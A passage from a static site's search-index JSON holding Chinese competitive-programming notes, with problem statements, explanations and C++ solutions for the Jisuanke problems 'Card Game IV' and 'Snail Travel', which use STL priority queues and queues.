\u4e2d\u3002\u7136\u540e\u5c06\u4e24\u4e2a\u6700\u5927\u503c\u51fa\u961f\uff0c\u5c06\u5269\u4f59\u7684 a_i \u548c b_i \u4e2d\u7684\u6700\u5927\u503c\u7ee7\u7eed\u76f8\u4e58\uff0c\u7d2f\u52a0\u5728 ans \u4e2d\uff0c\u76f4\u5230\u961f\u5217\u4e3a\u7a7a\uff0c\u6700\u540e\u8f93\u51fa ans \u3002 3. \u4ee3\u7801 # #include <iostream> #include <queue> #include <string.h> using namespace std; //\u964d\u5e8f\u961f\u5217a priority_queue<long long> aQueue; //\u964d\u5e8f\u961f\u5217b priority_queue<long long> bQueue; int main() { // test case int t; scanf(\"%d\", &t); // \u8f93\u5165buffer long long a, b; // \u5b58\u50a8\u7ed3\u679c long long ans = 0l; // \u8f93\u5165 for (int i = 0; i < t; i++) { scanf(\"%lld %lld\", &a, &b); // \u653e\u5165\u4f18\u5148\u961f\u5217 aQueue.push(a); bQueue.push(b); } // \u7ec4\u5408 for (int i = 0; i < t; i++) { // \u4e58\u79ef\u7d2f\u52a0 ans += aQueue.top() * bQueue.top(); // \u961f\u9996\u5143\u7d20\u51fa\u961f aQueue.pop(); bQueue.pop(); } // \u8f93\u51fa printf(\"%lld\\n\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"5.\u8ba1\u849c\u5ba2 T3058 \u5361\u724c\u6e38\u620f IV"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#t3058-iv","text":"","title":"\u8ba1\u849c\u5ba2 T3058 \u5361\u724c\u6e38\u620f IV"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#_1","text":"\u8ba1\u849c\u5ba2 T3058 \u5361\u724c\u6e38\u620f IV \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 524288 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#12-problem-description","text":"\u849c\u5934\u541b\u5728\u73a9\u4e00\u79cd\u5361\u724c\u6e38\u620f\uff0c\u4ed6\u6709 n \u5f20\u5361\u724c\uff0c\u6bcf\u5f20\u5361\u724c\u4e0a\u5199\u7740\u4e24\u4e2a\u6b63\u6574\u6570 a_i, b_i \uff0c a_i \u8868\u793a\u8fd9\u5f20\u5361\u724c\u7684\u80fd\u91cf\u503c\uff0c b_i \u8868\u793a\u8fd9\u5f20\u5361\u724c\u7684\u9b54\u6cd5\u503c\u3002 \u4ed6\u51c6\u5907\u4e00\u5f20\u4e00\u5f20\u6253\u51fa\u8fd9 n \u5f20\u5361\u724c\uff0c\u6bcf\u5f20\u5361\u724c\u4f1a\u5bf9\u654c\u4eba\u9020\u6210\u7684\u4f24\u5bb3\u662f\u8fd9\u5f20\u5361\u724c\u7684\u80fd\u91cf\u503c\u4e58\u9b54\u6cd5\u503c\u3002\u4f46\u662f\u849c\u5934\u541b\u89c9\u5f97\u8fd9\u6837\u628a\u8fd9 n \u5f20\u5361\u724c\u90fd\u51fa\u5b8c\u5bf9\u654c\u4eba\u9020\u6210\u7684\u4f24\u5bb3\u4e4b\u548c\u8fd8\u662f\u4e0d\u591f\u5927\uff0c\u6240\u4ee5\u4ed6\u5077\u5077\u5b66\u4f1a\u4e86\u4e00\u79cd\u4ed9\u672f\u3002 \u849c\u5934\u541b\u65bd\u5c55\u4e00\u6b21\u4ed9\u672f\u7684\u65f6\u5019\u4f1a\u4efb\u610f\u9009\u62e9\u4e24\u5f20\u5361\u724c\uff0c\u628a\u5b83\u4eec\u7684\u9b54\u6cd5\u503c\u4ea4\u6362\uff0c\u80fd\u91cf\u503c\u4e0d\u4ea4\u6362\u3002\u849c\u5934\u541b\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u6b21\u4ed9\u672f\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u6b21\u90fd\u4e0d\u4f7f\u7528\uff0c\u4ed6\u60f3\u77e5\u9053\u4f7f\u7528\u4e86\u82e5\u5e72\u6b21\u4ed9\u672f\u4ee5\u540e\u4e00\u5f20\u4e00\u5f20\u6253\u51fa\u8fd9 n \u5f20\u5361\u724c\uff0c\u5bf9\u654c\u4eba\u9020\u6210\u7684\u4f24\u5bb3\u4e4b\u548c\u6700\u5927\u662f\u591a\u5c11\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#13-input","text":"\u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 n (1 \\le n \\le 10^5) \u63a5\u4e0b\u6765 n \u884c\uff0c\u6bcf\u884c\u4e24\u4e2a\u6b63\u6574\u6570 a_i, b_i (1 \\le a_i, b_i \\le 10^6)","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#14-output","text":"\u8f93\u51fa\u4e00\u884c\uff0c\u5305\u542b\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u849c\u5934\u541b\u4f7f\u7528\u82e5\u5e72\u6b21\u4ed9\u672f\u4ee5\u540e\u4e00\u5f20\u4e00\u5f20\u6253\u51fa\u5361\u724c\uff0c\u5bf9\u654c\u4eba\u9020\u6210\u7684\u4f24\u5bb3\u4e4b\u548c\u7684\u6700\u5927\u503c\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#15-sample-input","text":"3 1 6 3 4 5 2","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#16-sample-output","text":"44","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#17-source","text":"\u8ba1\u849c\u5ba2 T3058 \u5361\u724c\u6e38\u620f IV","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#2","text":"STL\u57fa\u672c\u4f7f\u7528\u3002 \u4f7f\u7528 priority_queue \u5bf9\u6570\u636e\u8fdb\u884c\u5b58\u50a8\u548c\u6392\u5e8f\uff0c\u5c06\u80fd\u91cf\u503c a_i \u548c\u9b54\u6cd5\u503c b_i \u5206\u522b\u5b58\u50a8\u5728\u4e24\u4e2a\u4e0d\u540c\u7684\u4f18\u5148\u961f\u5217\u4e2d\uff0c\u964d\u5e8f\u6392\u5217\u3002 \u5c06 a_i \u4e2d\u7684\u6700\u5927\u503c\u548c b_i \u4e2d\u7684\u6700\u5927\u503c\u76f8\u4e58\uff0c\u5c06\u7ed3\u679c\u5b58\u50a8\u5728 ans \u4e2d\u3002\u7136\u540e\u5c06\u4e24\u4e2a\u6700\u5927\u503c\u51fa\u961f\uff0c\u5c06\u5269\u4f59\u7684 a_i \u548c b_i \u4e2d\u7684\u6700\u5927\u503c\u7ee7\u7eed\u76f8\u4e58\uff0c\u7d2f\u52a0\u5728 ans \u4e2d\uff0c\u76f4\u5230\u961f\u5217\u4e3a\u7a7a\uff0c\u6700\u540e\u8f93\u51fa ans \u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/5.%E8%AE%A1%E8%92%9C%E5%AE%A2_T3058_%E5%8D%A1%E7%89%8C%E6%B8%B8%E6%88%8F_IV/#3","text":"#include <iostream> #include <queue> #include <string.h> using namespace std; //\u964d\u5e8f\u961f\u5217a priority_queue<long long> aQueue; //\u964d\u5e8f\u961f\u5217b priority_queue<long long> bQueue; int main() { // test case int t; scanf(\"%d\", &t); // \u8f93\u5165buffer long long a, b; // \u5b58\u50a8\u7ed3\u679c long long ans = 0l; // \u8f93\u5165 for (int i = 0; i < t; i++) { scanf(\"%lld %lld\", &a, &b); // \u653e\u5165\u4f18\u5148\u961f\u5217 aQueue.push(a); bQueue.push(b); } // \u7ec4\u5408 for (int i = 0; i < t; i++) { // \u4e58\u79ef\u7d2f\u52a0 ans += aQueue.top() * bQueue.top(); // \u961f\u9996\u5143\u7d20\u51fa\u961f aQueue.pop(); bQueue.pop(); } // \u8f93\u51fa printf(\"%lld\\n\", ans); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/","text":"\u8ba1\u849c\u5ba2 39857 \u8717\u725b\u65c5\u6e38 # \u76ee\u5f55 # \u8ba1\u849c\u5ba2 39857 \u8717\u725b\u65c5\u6e38 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 524288 kB 1.2. Problem Description # \u8717\u725b\u5728\u5236\u5b9a\u4eca\u5929\u7684\u65c5\u6e38\u8ba1\u5212\uff0c\u6709 n \u4e2a\u666f\u70b9\u53ef\u9009\uff0c\u5b83\u5df2\u7ecf\u628a\u8fd9\u4e9b\u666f\u70b9\u6309\u7167\u987a\u8def\u6e38\u89c8\u7684\u987a\u5e8f\u6392\u6210\u4e00\u6392\u4e86\uff0c\u6bcf\u4e2a\u5730\u65b9\u6709\u76f8\u5e94\u7684\u666f\u89c2\uff0c\u8fd9\u91cc\u7528\u4e00\u4e2a\u6574\u6570\u8868\u793a\u3002 \u8717\u725b\u5e0c\u671b\u9009\u53d6\u8fde\u7eed\u7684\u4e00\u6bb5\u666f\u70b9\uff0c\u8fd8\u8981\u9009\u51fa\u6765\u7684\u6bcf\u4e00\u4e2a\u666f\u70b9\u7684\u666f\u89c2\u90fd\u4e0d\u540c\uff0c\u95ee\u5b83\u6700\u591a\u80fd\u9009\u51fa\u591a\u5c11\u4e2a\u666f\u70b9\u8fdb\u884c\u65c5\u6e38\u3002 1.3. Input # \u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 n (1 \\le n \\le 10^5) \u7b2c\u4e8c\u884c\uff0c\u5305\u542b n \u4e2a\u6b63\u6574\u6570 a_i(1 \\le a_i \\le 10^6) \uff0c\u7b2c i \u4e2a\u6574\u6570\u8868\u793a\u7b2c i \u4e2a\u666f\u70b9\u7684\u666f\u89c2\u3002 1.4. Output # \u8f93\u51fa\u4e00\u884c\uff0c\u5305\u542b\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u8717\u725b\u6700\u591a\u80fd\u9009\u51fa\u7684\u666f\u70b9\u6570\u3002 1.5. Sample Input # 5 1 2 3 2 1 1.6. Sample Output # 3 1.7. Source # \u8ba1\u849c\u5ba2 39857 \u8717\u725b\u65c5\u6e38 2. \u89e3\u8bfb # STL\u57fa\u672c\u4f7f\u7528\u3002 \u4f7f\u7528 queue \u5bf9\u6bcf\u4e2a\u5143\u7d20\u90fd\u4e0d\u540c\u7684\u5e8f\u5217\u8fdb\u884c\u5b58\u50a8\u3002\u4f9d\u6b21\u904d\u5386\u6bcf\u4e2a\u5143\u7d20\uff0c\u82e5\u5143\u7d20 a_i \u4e0e\u961f\u5217\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u4e0d\u76f8\u7b49\uff0c\u5219 a_i \u5165\u961f\u3002 \u82e5\u961f\u5217\u4e2d\u5b58\u5728\u4e0e a_i \u76f8\u7b49\u7684\u5143\u7d20\uff0c\u961f\u9996\u51fa\u961f\uff0c\u76f4\u5230\u961f\u5217\u4e2d\u6ca1\u6709\u4e0e a_i \u76f8\u7b49\u7684\u5143\u7d20\uff0c a_i \u5165\u961f\u3002 \u5728\u6bcf\u6b21\u5165\u961f\u64cd\u4f5c\u5b8c\u5168\u4ee5\u540e\uff0c\u8ba1\u7b97\u961f\u5217\u7684\u957f\u5ea6\uff0c\u5728\u6700\u540e\u8f93\u51fa\u961f\u5217\u957f\u5ea6\u7684\u6700\u5927\u503c\u3002 3. \u4ee3\u7801 # #include <iostream> #include <queue> #include <string.h> using namespace std; const int NUM = 1e6 + 1; // \u961f\u5217\u5b58\u50a8\u6700\u957f\u4e0d\u540c\u5e8f\u5217 queue<long long> qu; // \u5b58\u50a8\u503c long long list[NUM]; // \u6807\u5fd7\u503c\u662f\u5426\u5728\u961f\u5217\u4e2d bool markList[NUM]; int main() { // test case long long t; scanf(\"%lld\", &t); // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); memset(markList, 0, sizeof(markList)); // \u8f93\u5165buffer long long buffer; // \u6700\u5927\u503c size_t max = 0; // \u8f93\u5165 for (int i = 0; i < t; i++) { scanf(\"%lld\", &buffer); list[i] = buffer; } // \u5224\u65ad for (int i = 0; i < t; i++) { // \u5224\u65ad\u662f\u5426\u5728\u961f\u5217\u4e2d if (markList[list[i]] == 0) { // \u82e5\u4e0d\u5728\uff0c\u52a0\u5165\u961f\u5217 qu.push(list[i]); // \u6807\u8bb0\u6570\u5b57 markList[list[i]] = 1; } else { // \u82e5\u5728\uff0c\u5c06\u961f\u9996\u5143\u7d20\u51fa\u961f\u76f4\u5230\u6ca1\u6709\u5143\u7d20\u548c\u5373\u5c06\u65b0\u5165\u961f\u7684\u5143\u7d20\u91cd\u590d while (markList[list[i]] != 0) { markList[qu.front()] = 0; qu.pop(); } // \u52a0\u5165\u961f\u5217 qu.push(list[i]); // \u6807\u8bb0\u6570\u5b57 markList[list[i]] = 1; } // \u5b58\u50a8\u6700\u957f\u961f\u5217 if (qu.size() > max) { max = qu.size(); } } // \u8f93\u51fa printf(\"%lld\\n\", max); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.\u8ba1\u849c\u5ba2 39857 \u8717\u725b\u65c5\u6e38"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#39857","text":"","title":"\u8ba1\u849c\u5ba2 39857 \u8717\u725b\u65c5\u6e38"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#_1","text":"\u8ba1\u849c\u5ba2 39857 \u8717\u725b\u65c5\u6e38 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 524288 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#12-problem-description","text":"\u8717\u725b\u5728\u5236\u5b9a\u4eca\u5929\u7684\u65c5\u6e38\u8ba1\u5212\uff0c\u6709 n \u4e2a\u666f\u70b9\u53ef\u9009\uff0c\u5b83\u5df2\u7ecf\u628a\u8fd9\u4e9b\u666f\u70b9\u6309\u7167\u987a\u8def\u6e38\u89c8\u7684\u987a\u5e8f\u6392\u6210\u4e00\u6392\u4e86\uff0c\u6bcf\u4e2a\u5730\u65b9\u6709\u76f8\u5e94\u7684\u666f\u89c2\uff0c\u8fd9\u91cc\u7528\u4e00\u4e2a\u6574\u6570\u8868\u793a\u3002 \u8717\u725b\u5e0c\u671b\u9009\u53d6\u8fde\u7eed\u7684\u4e00\u6bb5\u666f\u70b9\uff0c\u8fd8\u8981\u9009\u51fa\u6765\u7684\u6bcf\u4e00\u4e2a\u666f\u70b9\u7684\u666f\u89c2\u90fd\u4e0d\u540c\uff0c\u95ee\u5b83\u6700\u591a\u80fd\u9009\u51fa\u591a\u5c11\u4e2a\u666f\u70b9\u8fdb\u884c\u65c5\u6e38\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#13-input","text":"\u7b2c\u4e00\u884c\uff0c\u4e00\u4e2a\u6b63\u6574\u6570 n (1 \\le n \\le 10^5) \u7b2c\u4e8c\u884c\uff0c\u5305\u542b n \u4e2a\u6b63\u6574\u6570 a_i(1 \\le a_i \\le 10^6) \uff0c\u7b2c i \u4e2a\u6574\u6570\u8868\u793a\u7b2c i \u4e2a\u666f\u70b9\u7684\u666f\u89c2\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#14-output","text":"\u8f93\u51fa\u4e00\u884c\uff0c\u5305\u542b\u4e00\u4e2a\u6574\u6570\uff0c\u8868\u793a\u8717\u725b\u6700\u591a\u80fd\u9009\u51fa\u7684\u666f\u70b9\u6570\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#15-sample-input","text":"5 1 2 3 2 1","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#16-sample-output","text":"3","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#17-source","text":"\u8ba1\u849c\u5ba2 39857 \u8717\u725b\u65c5\u6e38","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#2","text":"STL\u57fa\u672c\u4f7f\u7528\u3002 \u4f7f\u7528 queue \u5bf9\u6bcf\u4e2a\u5143\u7d20\u90fd\u4e0d\u540c\u7684\u5e8f\u5217\u8fdb\u884c\u5b58\u50a8\u3002\u4f9d\u6b21\u904d\u5386\u6bcf\u4e2a\u5143\u7d20\uff0c\u82e5\u5143\u7d20 a_i \u4e0e\u961f\u5217\u4e2d\u7684\u6240\u6709\u5143\u7d20\u90fd\u4e0d\u76f8\u7b49\uff0c\u5219 a_i \u5165\u961f\u3002 \u82e5\u961f\u5217\u4e2d\u5b58\u5728\u4e0e a_i \u76f8\u7b49\u7684\u5143\u7d20\uff0c\u961f\u9996\u51fa\u961f\uff0c\u76f4\u5230\u961f\u5217\u4e2d\u6ca1\u6709\u4e0e a_i \u76f8\u7b49\u7684\u5143\u7d20\uff0c a_i \u5165\u961f\u3002 \u5728\u6bcf\u6b21\u5165\u961f\u64cd\u4f5c\u5b8c\u5168\u4ee5\u540e\uff0c\u8ba1\u7b97\u961f\u5217\u7684\u957f\u5ea6\uff0c\u5728\u6700\u540e\u8f93\u51fa\u961f\u5217\u957f\u5ea6\u7684\u6700\u5927\u503c\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/6.%E8%AE%A1%E8%92%9C%E5%AE%A2_39857_%E8%9C%97%E7%89%9B%E6%97%85%E6%B8%B8/#3","text":"#include <iostream> #include <queue> #include <string.h> using namespace std; const int NUM = 1e6 + 1; // \u961f\u5217\u5b58\u50a8\u6700\u957f\u4e0d\u540c\u5e8f\u5217 queue<long long> qu; // \u5b58\u50a8\u503c long long list[NUM]; // \u6807\u5fd7\u503c\u662f\u5426\u5728\u961f\u5217\u4e2d bool markList[NUM]; int main() { // test case long long t; scanf(\"%lld\", &t); // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); memset(markList, 0, sizeof(markList)); // \u8f93\u5165buffer long long buffer; // \u6700\u5927\u503c size_t max = 0; // \u8f93\u5165 for (int i = 0; i < t; i++) { scanf(\"%lld\", &buffer); list[i] = buffer; } // \u5224\u65ad for (int i = 0; i < t; i++) { // \u5224\u65ad\u662f\u5426\u5728\u961f\u5217\u4e2d if (markList[list[i]] == 0) { // \u82e5\u4e0d\u5728\uff0c\u52a0\u5165\u961f\u5217 qu.push(list[i]); // \u6807\u8bb0\u6570\u5b57 markList[list[i]] = 1; } else { // \u82e5\u5728\uff0c\u5c06\u961f\u9996\u5143\u7d20\u51fa\u961f\u76f4\u5230\u6ca1\u6709\u5143\u7d20\u548c\u5373\u5c06\u65b0\u5165\u961f\u7684\u5143\u7d20\u91cd\u590d while (markList[list[i]] != 0) { markList[qu.front()] = 0; qu.pop(); } // \u52a0\u5165\u961f\u5217 qu.push(list[i]); // \u6807\u8bb0\u6570\u5b57 markList[list[i]] = 1; } // \u5b58\u50a8\u6700\u957f\u961f\u5217 if (qu.size() > max) { max = qu.size(); } } // \u8f93\u51fa printf(\"%lld\\n\", max); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/STL%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/7.%E7%89%9B%E5%AE%A2%E7%BD%91_NC207028_%E7%AC%ACk%E5%B0%8F%E6%95%B0/","text":"\u725b\u5ba2\u7f51 